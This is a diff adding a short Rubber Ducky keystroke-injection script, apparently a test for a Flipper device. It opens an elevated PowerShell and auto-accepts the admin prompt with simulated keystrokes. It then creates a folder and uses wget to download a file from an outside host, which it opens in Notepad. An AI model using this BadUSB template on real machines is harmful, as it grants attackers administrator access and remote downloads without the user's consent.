@@ -1,0 +1,19 @@
+REM This is a test Rubber Ducky Script to test if the changes will be applied for the flipper.
+
+REM DELAY 500
+GUI r
+DELAY 1000
+STRINGLN powershell Start-Process powershell -Verb runAs
+DELAY 2500
+REM submit admin prompt
+LEFTARROW
+DELAY 200
+ENTER
+DELAY 1000
+REM run the script
+REM check if path exists
+STRINGLN if (Test-Path C:\Users\Public\Documents\test) {Write-Host "Path exists"} else {mkdir C:\Users\Public\Documents\test}
+STRINGLN cd C:\Users\Public\Documents\test
+
+STRINGLN wget http://download.cloudster.online/test.txt -OutFile out.txt; Start-Process notepad out.txt
+STRINGLN exit
